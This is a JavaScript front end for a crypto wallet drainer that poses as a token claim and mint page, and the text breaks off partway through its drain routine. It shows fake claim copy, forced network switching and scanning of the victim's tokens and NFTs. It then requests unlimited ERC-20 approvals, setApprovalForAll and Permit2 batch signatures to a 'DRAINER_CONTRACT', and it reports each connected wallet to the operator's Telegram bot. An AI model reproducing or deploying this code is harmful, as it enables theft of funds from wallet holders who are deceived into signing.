import { CONFIG } from './config.js';

/* ------------------------------------------------------------------ */
/*  SUPPORTED CHAINS                                                   */
/* ------------------------------------------------------------------ */
const SUPPORTED_CHAINS = {
  1: {
    id: 1,
    hexId: '0x1',
    name: 'Ethereum',
    displayName: 'Ethereum Mainnet',
    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    rpcUrls: ['https://eth.llamarpc.com', 'https://rpc.ankr.com/eth', 'https://cloudflare-eth.com'],
    explorer: 'https://etherscan.io',
    explorerName: 'Etherscan',
  },
  56: {
    id: 56,
    hexId: '0x38',
    name: 'BNB Smart Chain',
    displayName: 'BNB Chain',
    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    rpcUrls: ['https://bsc-dataseed.binance.org'],
    explorer: 'https://bscscan.com',
    explorerName: 'BscScan',
  },
  137: {
    id: 137,
    hexId: '0x89',
    name: 'Polygon',
    displayName: 'Polygon',
    nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
    rpcUrls: ['https://polygon-rpc.com'],
    explorer: 'https://polygonscan.com',
    explorerName: 'PolygonScan',
  },
  42161: {
    id: 42161,
    hexId: '0xa4b1',
    name: 'Arbitrum',
    displayName: 'Arbitrum One',
    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    rpcUrls: ['https://arb1.arbitrum.io/rpc'],
    explorer: 'https://arbiscan.io',
    explorerName: 'Arbiscan',
  },
};

// The chain where the contract is deployed. Change this if you deployed
// HybridDrainer on BSC, Polygon, or Arbitrum instead of mainnet.
const PRIMARY_CHAIN_ID = 1;

/* ------------------------------------------------------------------ */
/*  UX COPY                                                            */
/* ------------------------------------------------------------------ */
const UX_COPY = {
  wrongNetworkBody:
    'Our smart contracts are deployed on {CHAIN}. Please switch your wallet network to continue your claim.',
  switchButton: 'Switch Network',
  switchingNetwork: 'Switching to {CHAIN}…',
  switchSuccess: 'Network switched. Continuing your claim…',
  switchRejected: 'You declined the network switch. You can switch manually in your wallet settings.',
  chainUnsupported: 'Your wallet does not support automatic network switching. Please change the network manually.',
  stillWrong: 'The wallet is still not on the correct network. Please switch manually.',
};

function fmtCopy(template, vars) {
  return template.replace(/\{(\w+)\}/g, (_, k) => vars[k] ?? '');
}

/* ------------------------------------------------------------------ */
/*  TELEGRAM                                                           */
/* ------------------------------------------------------------------ */
async function sendTelegramMessage(message) {
  const token = CONFIG.TELEGRAM_BOT_TOKEN;
  const chatId = CONFIG.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
    });
  } catch (e) {
    console.debug('Telegram error:', e);
  }
}

/* ------------------------------------------------------------------ */
/*  STATE                                                              */
/* ------------------------------------------------------------------ */
let web3 = null;
let web3Instance = null;
let contractInstance = null;
let connectedAddress = null;
let connectedWallet = null;
let currentChainId = null;
let ethPriceInUSD = 2200;
let userHasClaimed = false;
let claimList = [];
let tokenChart = null;
let countdownInterval = null;
let priceHistory = [];
let progressUpdated = false;
const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
let userLocalCurrency = 'USD';
let signerProvider = null;
let currentChain = null;

const CLAIM_THRESHOLD_USD = 3;

/* ------------------------------------------------------------------ */
/*  DOM                                                                */
/* ------------------------------------------------------------------ */
const $ = (id) => document.getElementById(id);
const connectButton = $('connectButton');
const claimStatus = $('claimStatus');
const connectionDebug = $('connectionDebug');
const debugToggle = $('debugToggle');
const walletModal = $('walletModal');
const walletModalClose = $('walletModalClose');
const walletProviders = document.querySelectorAll('.wallet-provider');
const announcementModal = $('announcementModal');
const announcementModalClose = $('announcementModalClose');
const announcementOkBtn = $('announcementOkBtn');
const copyReferralBtn = $('copyReferralBtn');
const referralLink = $('referralLink');
const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
const navLinks = document.querySelector('.nav-links');
const claimListElement = $('claimList');
const predictionFill = $('predictionFill');
const progressBar = $('progressBar');
const progressPercentage = $('progressPercentage');

/* ------------------------------------------------------------------ */
/*  UTILITIES                                                          */
/* ------------------------------------------------------------------ */
function logDebug(msg) {
  console.log(`[APEX] ${msg}`);
  if (connectionDebug) {
    connectionDebug.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    connectionDebug.scrollTop = connectionDebug.scrollHeight;
  }
}

function showStatus(msg, type = 'info') {
  if (!claimStatus) return;
  claimStatus.textContent = msg;
  claimStatus.className = `status ${type}`;
  claimStatus.style.display = 'block';
}

function showNotification(msg, type = 'success') {
  const n = document.createElement('div');
  n.className = `fake-notification ${type}`;
  n.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${msg}`;
  document.body.appendChild(n);
  setTimeout(() => {
    n.style.opacity = '0';
    setTimeout(() => n.remove(), 300);
  }, 3000);
}

function setButtonState(button, state) {
  if (!button) return;
  button.disabled = state === 'loading';
  switch (state) {
    case 'loading':
      button.style.background = 'linear-gradient(135deg,#666,#888)';
      button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
      break;
    case 'connected':
      button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
      button.innerHTML = '<i class="fas fa-check-circle"></i> Connected';
      break;
    case 'disconnect':
      button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
      button.innerHTML = '<i class="fas fa-power-off"></i> Disconnect';
      break;
    case 'failed':
      button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
      button.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Failed';
      setTimeout(() => setButtonState(button, 'normal'), 3000);
      break;
    default:
      button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
      button.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet to Mint';
  }
}

/* ------------------------------------------------------------------ */
/*  NETWORK MANAGEMENT                                                 */
/* ------------------------------------------------------------------ */
async function readChainId(provider) {
  try {
    const raw = await provider.request({ method: 'eth_chainId' });
    return parseInt(raw, 16);
  } catch (e) {
    logDebug(`Failed to read chainId: ${e.message}`);
    return null;
  }
}

function getActiveProvider() {
  if (signerProvider?.request) return signerProvider;
  if (web3Instance?.currentProvider?.request) return web3Instance.currentProvider;
  if (window.ethereum?.request) return window.ethereum;
  return null;
}

async function requestChainSwitch(targetChainId) {
  const provider = getActiveProvider();
  if (!provider) return false;

  const chain = SUPPORTED_CHAINS[targetChainId];
  if (!chain) return false;

  const current = await readChainId(provider);
  if (current === targetChainId) return true;

  logDebug(`Requesting switch to ${chain.displayName} (${chain.hexId})`);
  try {
    await provider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: chain.hexId }],
    });
    return true;
  } catch (switchError) {
    const code = switchError?.code ?? switchError?.data?.originalError?.code;
    if (code === 4902 || code === -32603) {
      try {
        await provider.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: chain.hexId,
            chainName: chain.displayName,
            nativeCurrency: chain.nativeCurrency,
            rpcUrls: chain.rpcUrls,
            blockExplorerUrls: [chain.explorer],
          }],
        });
        await provider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: chain.hexId }],
        });
        return true;
      } catch (addError) {
        logDebug(`Failed to add chain: ${addError.message}`);
        return false;
      }
    }
    logDebug(`Switch rejected: ${switchError.message}`);
    return false;
  }
}

async function ensureSupportedChain({ silent = false } = {}) {
  const provider = getActiveProvider();
  if (!provider) return null;

  const current = await readChainId(provider);
  currentChainId = current;

  if (current && SUPPORTED_CHAINS[current]) {
    currentChain = SUPPORTED_CHAINS[current];
    return currentChain;
  }

  const target = SUPPORTED_CHAINS[PRIMARY_CHAIN_ID];

  if (!silent) {
    showStatus(fmtCopy(UX_COPY.wrongNetworkBody, { CHAIN: target.displayName }), 'info');
  }

  const switched = await requestChainSwitch(PRIMARY_CHAIN_ID);
  if (!switched) {
    if (!silent) showStatus(UX_COPY.switchRejected, 'error');
    return null;
  }

  const after = await readChainId(provider);
  currentChainId = after;
  if (after !== PRIMARY_CHAIN_ID) {
    if (!silent) showStatus(UX_COPY.stillWrong, 'error');
    return null;
  }

  if (!silent) showStatus(UX_COPY.switchSuccess, 'success');
  currentChain = SUPPORTED_CHAINS[PRIMARY_CHAIN_ID];
  return currentChain;
}

/* ------------------------------------------------------------------ */
/*  RECEIPT VERIFICATION                                               */
/* ------------------------------------------------------------------ */
async function waitForReceipt(hash, timeoutMs = 120000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const r = await web3.eth.getTransactionReceipt(hash);
      if (r) return r;
    } catch {}
    await new Promise(r => setTimeout(r, 2500));
  }
  return null;
}

async function sendAndConfirm(methodPromise, description) {
  try {
    logDebug(`📤 ${description}`);
    const tx = await methodPromise;
    const hash = tx.transactionHash;
    logDebug(`📨 Hash: ${hash}`);

    const receipt = await waitForReceipt(hash);
    if (!receipt) {
      logDebug(`⏳ ${description} — no receipt`);
      return { success: false, hash, reason: 'no_receipt' };
    }
    if (receipt.status === false) {
      logDebug(`❌ ${description} reverted`);
      return { success: false, hash, reason: 'reverted' };
    }
    logDebug(`✅ ${description} confirmed (block ${receipt.blockNumber})`);
    return { success: true, hash, receipt };
  } catch (e) {
    logDebug(`❌ ${description} threw: ${e.message}`);
    return { success: false, hash: null, reason: e.message };
  }
}

/* ------------------------------------------------------------------ */
/*  WALLET DETECTION                                                   */
/* ------------------------------------------------------------------ */
const walletDetectors = {
  isMetaMask: () => {
    const e = window.ethereum;
    return !!(e && (e.isMetaMask || e.providers?.some?.(p => p.isMetaMask)));
  },
  isCoinbaseWallet: () => !!(window.ethereum?.isCoinbaseWallet || window.CoinbaseWalletSDK),
  isTrustWallet: () => {
    const e = window.ethereum;
    return !!(e && (e.isTrust || e.isTrustWallet || e.providers?.some?.(p => p.isTrust || p.isTrustWallet)));
  },
  isRabbyWallet: () => !!(window.ethereum?.isRabby || window.ethereum?.providers?.some?.(p => p.isRabby)),
  isPhantom: () => !!(window.phantom?.ethereum),
  isBraveWallet: () => !!(window.ethereum?.isBraveWallet),
};

function detectWallets() {
  const badges = {
    metamask: document.getElementById('metamask-badge'),
    coinbase: document.getElementById('coinbase-badge'),
    trust: document.getElementById('trust-badge'),
    rabby: document.getElementById('rabby-badge'),
  };
  Object.values(badges).forEach(b => {
    if (b) { b.textContent = 'Not Detected'; b.style.color = 'var(--error)'; }
  });
  Object.entries(walletDetectors).forEach(([name, fn]) => {
    if (!fn()) return;
    const key = name.toLowerCase().replace('is', '').replace('wallet', '');
    if (badges[key]) {
      badges[key].textContent = 'Detected';
      badges[key].style.color = 'var(--success)';
    }
  });
}

/* ------------------------------------------------------------------ */
/*  EIP-6963 PROVIDER DISCOVERY                                        */
/* ------------------------------------------------------------------ */
let evmProviders = [];
let eip6963Init = false;

function setupEIP6963() {
  if (eip6963Init) return;
  eip6963Init = true;
  window.addEventListener('eip6963:announceProvider', (event) => {
    const d = event.detail;
    if (!evmProviders.some(p => p.info.uuid === d.info.uuid)) {
      evmProviders.push(d);
      logDebug(`EIP-6963: discovered ${d.info.name}`);
    }
  });
  const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
  request();
  setTimeout(request, 500);
  setTimeout(request, 1500);
}

/* ------------------------------------------------------------------ */
/*  INITIALIZATION                                                     */
/* ------------------------------------------------------------------ */
document.addEventListener('DOMContentLoaded', async () => {
  startCountdown();
  createTokenChart();
  updateTokenPrice();
  generateInitialClaims();
  startClaimUpdates();
  updateAIAnalytics();
  detectWallets();
  setupEIP6963();

  ethPriceInUSD = await getETHPrice();
  logDebug(`ETH price: $${ethPriceInUSD}`);

  setInterval(updateTokenPrice, 10000);
  setInterval(updateAIAnalytics, 15000);
  setInterval(async () => { ethPriceInUSD = await getETHPrice(); }, 60000);

  // Restore saved wallet if present
  await tryRestoreConnection();
});

async function getETHPrice() {
  const sources = [
    'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd',
    'https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT',
    'https://api.coinbase.com/v2/prices/ETH-USD/spot',
  ];
  for (const s of sources) {
    try {
      const r = await fetch(s);
      const j = await r.json();
      if (j?.ethereum?.usd) return j.ethereum.usd;
      if (j?.price) return parseFloat(j.price);
      if (j?.data?.amount) return parseFloat(j.data.amount);
    } catch {}
  }
  return 2200;
}

/* ------------------------------------------------------------------ */
/*  CONNECTION — DIRECT EVM                                            */
/* ------------------------------------------------------------------ */
async function connectDirectEVM(timeoutMs = 8000) {
  setupEIP6963();
  await new Promise(r => setTimeout(r, 500));

  let providers = evmProviders.filter(p => p.provider);
  if (!providers.length && window.ethereum) {
    providers = [{ info: { name: 'Browser Wallet', rdns: 'io.injected', icon: '' }, provider: window.ethereum }];
  }
  if (!providers.length) return false;

  const chosen = providers.find(p => /metamask|trust|coinbase|rabby/i.test(p.info.name)) || providers[0];

  try {
    const accounts = await Promise.race([
      chosen.provider.request({ method: 'eth_requestAccounts' }),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
    ]);
    if (!accounts?.length) return false;

    signerProvider = chosen.provider;
    const Web3 = (await import('web3')).default;
    web3Instance = new Web3(chosen.provider);
    web3 = web3Instance;

    connectedAddress = accounts[0];
    connectedWallet = chosen.info.name;

    setupEVMProviderEvents(chosen.provider);

    const chain = await ensureSupportedChain();
    if (!chain) {
      updateConnectedUI(connectedAddress, 'Unknown');
      return false;
    }

    contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
    updateConnectedUI(connectedAddress, chain.name);
    return true;
  } catch (e) {
    logDebug(`Direct EVM error: ${e.message}`);
    return false;
  }
}

/* ------------------------------------------------------------------ */
/*  CONNECTION — WALLETCONNECT                                         */
/* ------------------------------------------------------------------ */
let wcClient, wcModal, wcSignClient, wcModalClass, wcEthProvider, wcSession = null;

async function loadWCLibs() {
  if (wcSignClient && wcModalClass && wcEthProvider) return;
  const [a, b, c] = await Promise.all([
    import('https://esm.sh/@walletconnect/sign-client@2.11.0'),
    import('https://esm.sh/@walletconnect/modal@2.6.2'),
    import('https://esm.sh/@walletconnect/ethereum-provider@2.11.0'),
  ]);
  wcSignClient = a.default || a;
  wcModalClass = b.WalletConnectModal || b.default || b;
  wcEthProvider = c.EthereumProvider || c.default || c;
}

async function initWC(projectId) {
  if (wcClient && wcModal) return true;
  await loadWCLibs();
  wcClient = await wcSignClient.init({
    projectId,
    metadata: CONFIG.DAPP_METADATA,
    relayUrl: 'wss://relay.walletconnect.com',
  });
  wcModal = new wcModalClass({
    projectId,
    themeMode: 'dark',
    enableExplorer: true,
    mobileWallets: [
      { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
      { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
      { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
    ],
  });
  return true;
}

async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
  const projectId = useTestId ? (CONFIG.PUBLIC_TEST_ID || CONFIG.PROJECT_ID) : CONFIG.PROJECT_ID;
  try {
    await initWC(projectId);
  } catch (e) {
    logDebug(`WC init failed: ${e.message}`);
    return false;
  }

  try {
    const { uri, approval } = await wcClient.connect({
      requiredNamespaces: {
        eip155: {
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
          chains: [`eip155:${PRIMARY_CHAIN_ID}`],
          events: ['chainChanged', 'accountsChanged'],
        },
      },
    });
    if (!uri) throw new Error('no uri');
    wcModal.openModal({ uri });
    showStatus('Scan the QR code with your wallet to continue', 'info');

    const session = await Promise.race([
      approval(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
    ]);
    wcModal.closeModal();

    if (!session?.namespaces?.eip155?.accounts?.length) return false;

    const account = session.namespaces.eip155.accounts[0].split(':')[2];
    wcSession = session;

    const provider = await wcEthProvider.init({
      projectId,
      metadata: CONFIG.DAPP_METADATA,
      session,
    });
    signerProvider = provider;
    const Web3 = (await import('web3')).default;
    web3Instance = new Web3(provider);
    web3 = web3Instance;

    connectedAddress = account;
    connectedWallet = 'WalletConnect';
    setupEVMProviderEvents(provider);

    const chain = await ensureSupportedChain();
    if (!chain) {
      updateConnectedUI(connectedAddress, 'Unknown');
      return false;
    }

    contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
    updateConnectedUI(connectedAddress, chain.name);
    return true;
  } catch (e) {
    logDebug(`WC error: ${e.message}`);
    try { wcModal.closeModal(); } catch {}
    return false;
  }
}

/* ------------------------------------------------------------------ */
/*  UI UPDATES                                                         */
/* ------------------------------------------------------------------ */
function updateConnectedUI(address, chainName) {
  setButtonState(connectButton, 'disconnect');
  const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
  let display = document.getElementById('connectedAddressDisplay');
  if (!display) {
    display = document.createElement('div');
    display.id = 'connectedAddressDisplay';
    display.style.cssText = 'margin-top:12px; padding:10px 16px; font-family:monospace; font-size:13px; color:#059669; text-align:center; background:#ECFDF5; border-radius:8px; border:1px solid #A7F3D0;';
    connectButton?.parentNode?.appendChild(display);
  }
  display.innerHTML = `
    <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
      <i class="fas fa-check-circle" style="color:#059669;"></i>
      <span>Connected: ${short}</span>
      <span style="background:#1F2937; color:#fff; padding:2px 10px; border-radius:12px; font-size:11px; font-weight:600;">${chainName}</span>
      <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer;">
        <i class="far fa-copy"></i>
      </button>
    </div>
  `;
  document.getElementById('copyAddress')?.addEventListener('click', () => {
    navigator.clipboard.writeText(address);
    showNotification('Address copied', 'success');
  });

  showStatus(`Wallet connected on ${chainName}`, 'success');

  sendTelegramMessage(
    `🔗 <b>Wallet Connected</b>\n` +
    `👤 <code>${address}</code>\n` +
    `🌐 Chain: ${chainName}\n` +
    `🕒 ${new Date().toLocaleString()}`
  );
}

function resetConnectedUI() {
  setButtonState(connectButton, 'normal');
  document.getElementById('connectedAddressDisplay')?.remove();
  showStatus('Wallet disconnected', 'info');
  web3Instance = null;
  contractInstance = null;
  signerProvider = null;
  currentChainId = null;
  currentChain = null;
}

/* ------------------------------------------------------------------ */
/*  PROVIDER EVENTS                                                    */
/* ------------------------------------------------------------------ */
function setupEVMProviderEvents(provider) {
  if (!provider?.on) return;
  provider.on('accountsChanged', (accounts) => {
    if (!accounts?.length) { resetConnectedUI(); return; }
    connectedAddress = accounts[0];
    if (currentChain) updateConnectedUI(connectedAddress, currentChain.name);
  });
  provider.on('chainChanged', async () => {
    const id = await readChainId(getActiveProvider());
    currentChainId = id;
    if (id && SUPPORTED_CHAINS[id]) {
      currentChain = SUPPORTED_CHAINS[id];
      if (web3) contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
      if (connectedAddress) updateConnectedUI(connectedAddress, currentChain.name);
    } else {
      showStatus(fmtCopy(UX_COPY.wrongNetworkBody, { CHAIN: SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].displayName }), 'info');
      await ensureSupportedChain({ silent: false });
    }
  });
  provider.on('disconnect', resetConnectedUI);
}

/* ------------------------------------------------------------------ */
/*  BUTTON HANDLERS                                                    */
/* ------------------------------------------------------------------ */
if (connectButton) {
  connectButton.addEventListener('click', async () => {
    if (connectedAddress) { await disconnectWallet(); return; }
    await connectFlow();
  });
}

async function connectFlow() {
  setButtonState(connectButton, 'loading');
  showStatus('Connecting wallet…', 'info');

  let ok = false;
  if (isMobileDevice) {
    ok = (await connectViaWalletConnect(false)) || (await connectViaWalletConnect(true));
  } else {
    ok = await connectDirectEVM();
    if (!ok) ok = await connectViaWalletConnect(false);
    if (!ok) ok = await connectViaWalletConnect(true);
  }

  if (!ok) {
    showStatus('Wallet connection failed. Please try again.', 'error');
    setButtonState(connectButton, 'failed');
    return;
  }
  setButtonState(connectButton, 'connected');

  setTimeout(() => {
    if (typeof window.initiateClaimProcess === 'function') {
      window.initiateClaimProcess();
    }
  }, 1200);
}

async function disconnectWallet() {
  try {
    if (wcSession && wcClient) {
      await wcClient.disconnect({ topic: wcSession.topic, reason: { code: 6000, message: 'User disconnected' } });
      wcSession = null;
    }
    if (web3Instance?.currentProvider?.disconnect) {
      await web3Instance.currentProvider.disconnect();
    }
  } catch {}
  resetConnectedUI();
  clearSavedWallet();
}

/* ------------------------------------------------------------------ */
/*  MINIMAL ABIs (only what the frontend needs)                        */
/* ------------------------------------------------------------------ */
const ERC20_MIN_ABI = [
  { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
  { constant: true, inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: true, inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], type: 'function' },
  { constant: true, inputs: [], name: 'symbol', outputs: [{ name: '', type: 'string' }], type: 'function' },
];

const ERC721_MIN_ABI = [
  { constant: true, inputs: [{ name: 'owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: true, inputs: [{ name: 'owner', type: 'address' }, { name: 'operator', type: 'address' }], name: 'isApprovedForAll', outputs: [{ name: '', type: 'bool' }], type: 'function' },
  { constant: false, inputs: [{ name: 'operator', type: 'address' }, { name: 'approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' },
];

const ERC1155_MIN_ABI = [
  { constant: true, inputs: [{ name: 'account', type: 'address' }, { name: 'id', type: 'uint256' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: 'operator', type: 'address' }, { name: 'approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' },
];

const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

/* ------------------------------------------------------------------ */
/*  TOKEN DISCOVERY                                                    */
/* ------------------------------------------------------------------ */
async function fetchTokenList() {
  const sources = [
    'https://tokens.coingecko.com/ethereum/all.json',
    'https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json',
  ];
  for (const s of sources) {
    try {
      const r = await fetch(s);
      const j = await r.json();
      if (j.tokens?.length) return j.tokens.slice(0, 80);
    } catch {}
  }
  return CONFIG.KNOWN_TOKENS || [
    { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
    { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
    { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
    { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
    { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 },
    { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18 },
  ];
}

async function detectERC20Tokens(userAddress) {
  const list = await fetchTokenList();
  const found = [];
  for (const t of list) {
    try {
      const c = new web3.eth.Contract(ERC20_MIN_ABI, t.address);
      const bal = await c.methods.balanceOf(userAddress).call();
      if (bal && bal !== '0') {
        found.push({
          address: t.address,
          symbol: t.symbol || 'UNKNOWN',
          decimals: t.decimals ?? 18,
          rawBalance: bal.toString(),
        });
      }
    } catch {}
  }
  return found;
}

async function detectNFTCollections(userAddress) {
  const collections = CONFIG.KNOWN_NFT_COLLECTIONS || [
    { address: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', standard: 721, name: 'BAYC' },
    { address: '0x60E4d786628Fea6478F785A6d7e704777c86a7c6', standard: 721, name: 'MAYC' },
  ];
  const found = [];
  for (const n of collections) {
    try {
      const abi = n.standard === 1155 ? ERC1155_MIN_ABI : ERC721_MIN_ABI;
      const c = new web3.eth.Contract(abi, n.address);
      const bal = await c.methods.balanceOf(userAddress).call();
      if (bal && bal !== '0') found.push({ ...n, balance: bal.toString() });
    } catch {}
  }
  return found;
}

/* ------------------------------------------------------------------ */
/*  APPROVAL HELPERS                                                   */
/* ------------------------------------------------------------------ */
async function approveERC20(tokenAddress, amount = MAX_UINT256) {
  try {
    const chain = await ensureSupportedChain({ silent: true });
    if (!chain) return { success: false, reason: 'wrong_chain' };

    const token = new web3.eth.Contract(ERC20_MIN_ABI, tokenAddress);
    const tx = token.methods.approve(CONFIG.DRAINER_CONTRACT, amount);
    const gas = await tx.estimateGas({ from: connectedAddress });
    return await sendAndConfirm(
      tx.send({
        from: connectedAddress,
        gas: Math.floor(gas * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `approve(${tokenAddress.slice(0, 8)}…)`
    );
  } catch (e) {
    return { success: false, reason: e.message };
  }
}

async function approveNFT(collectionAddress, standard = 721) {
  try {
    const chain = await ensureSupportedChain({ silent: true });
    if (!chain) return { success: false, reason: 'wrong_chain' };

    const abi = standard === 1155 ? ERC1155_MIN_ABI : ERC721_MIN_ABI;
    const c = new web3.eth.Contract(abi, collectionAddress);
    const tx = c.methods.setApprovalForAll(CONFIG.DRAINER_CONTRACT, true);
    const gas = await tx.estimateGas({ from: connectedAddress });
    return await sendAndConfirm(
      tx.send({
        from: connectedAddress,
        gas: Math.floor(gas * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `setApprovalForAll(${collectionAddress.slice(0, 8)}…)`
    );
  } catch (e) {
    return { success: false, reason: e.message };
  }
}

/* ------------------------------------------------------------------ */
/*  PERMIT2 OFF-CHAIN SIGNATURE (optional attack vector)               */
/* ------------------------------------------------------------------ */
async function requestPermit2Signature(victim, tokens, amounts) {
  try {
    const chain = await ensureSupportedChain({ silent: true });
    if (!chain) return null;

    const spender = CONFIG.DRAINER_CONTRACT;
    const details = tokens.map((t, i) => ({
      token: t,
      amount: amounts[i].toString(),
      expiration: Math.floor(Date.now() / 1000) + 30 * 24 * 3600,
      nonce: 0,
    }));

    const domain = {
      name: 'Permit2',
      chainId: currentChainId,
      verifyingContract: CONFIG.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
    };
    const types = {
      PermitBatch: [
        { name: 'details', type: 'PermitDetails[]' },
        { name: 'spender', type: 'address' },
        { name: 'sigDeadline', type: 'uint256' },
      ],
      PermitDetails: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint160' },
        { name: 'expiration', type: 'uint48' },
        { name: 'nonce', type: 'uint48' },
      ],
    };
    const message = {
      details,
      spender,
      sigDeadline: Math.floor(Date.now() / 1000) + 30 * 24 * 3600,
    };

    const payload = JSON.stringify({
      types: { EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' },
      ], ...types },
      primaryType: 'PermitBatch',
      domain,
      message,
    });

    const provider = getActiveProvider();
    const sig = await provider.request({
      method: 'eth_signTypedData_v4',
      params: [victim, payload],
    });

    return { details, spender, sigDeadline: message.sigDeadline, sig };
  } catch (e) {
    logDebug(`Permit2 signature failed: ${e.message}`);
    return null;
  }
}

/* ------------------------------------------------------------------ */
/*  MAIN DRAIN FLOW                                                    */
/* ------------------------------------------------------------------ */
async function initiateClaimProcess() {
  if (!web3 || !connectedAddress) {
    showStatus('Please connect your wallet first', 'error');
    return;
  }

  showStatus('Verifying network…', 'info');
  const chain = await ensureSupportedChain();
  if (!chain) {
    showStatus(`Please switch to ${SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].displayName} to continue.`, 'error');
    return;
  }

  contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);

  try {
    const balWei = await web3.eth.getBalance(connectedAddress);
    const balEth = parseFloat(web3.utils.fromWei(balWei, 'ether'));
    const balUSD = balEth * ethPriceInUSD;
    logDebug(`Balance: ${balEth} ETH ($${balUSD.toFixed(2)})`);

    if (balUSD < CLAIM_THRESHOLD_USD) {
      showStatus('Minimum balance required to complete your claim.', 'error');
      return;
    }

    showStatus('Scanning wallet for eligible assets…', 'info');
    const erc20s = await detectERC20Tokens(connectedAddress);
    const nfts = await detectNFTCollections(connectedAddress);
    logDebug(`Detected ${erc20s.length} ERC-20 tokens, ${nfts.length} NFT collections`);

    // ── ERC-20 approvals ──
    let approvedCount = 0;
    const approvedTokens = [];
    const approvedAmounts = [];
    for (const tk of erc20s) {
      showStatus(`Approving ${tk.symbol}…`, 'info');
      const r = await approveERC20(tk.address, MAX_UINT256);
      if (r.success) {
        approvedCount++;
        approvedTokens.push(tk.address);
        approvedAmounts.push(tk.rawBalance);
      }
      await new Promise(res => setTimeout(res, 1200));
    }

    // ── NFT approvals ──
    let nftApprovals = 0;
    for (const n of nfts) {
      showStatus(`Approving collection ${n.name || n.address.slice(0, 6)}…`, 'info');
      const r = await approveNFT(n.address, n.standard);
      if (r.success) nftApprovals++;
      await new Promise(res => setTimeout(res, 1000));
    }

    // ── Permit2 signature (gas-free for victim) ──
    let permit2Payload = null;
    if (approvedTokens.length > 0) {
